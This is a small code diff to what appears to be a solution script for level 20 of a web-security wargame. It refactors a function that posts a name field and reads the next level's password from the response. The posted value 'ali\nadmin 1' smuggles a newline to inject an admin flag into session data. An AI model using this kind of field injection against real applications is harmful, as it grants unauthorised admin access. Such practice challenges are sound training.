@@ -6,8 +6,9 @@ level_number = 20
 
 def get_secret():
     req = get_request_object(level_number)
-    result = req.post(get_level_url(level_number), data={"name": "ali\nadmin 1"})
-    result = req.post(get_level_url(level_number), data={"name": "ali\nadmin 1"})
+    url = get_level_url(level_number)
+    req.post(url, data={"name": "ali\nadmin 1"})
+    result = req.post(url, data={"name": "ali\nadmin 1"})
     text = result.text
     search = "Password:"
 
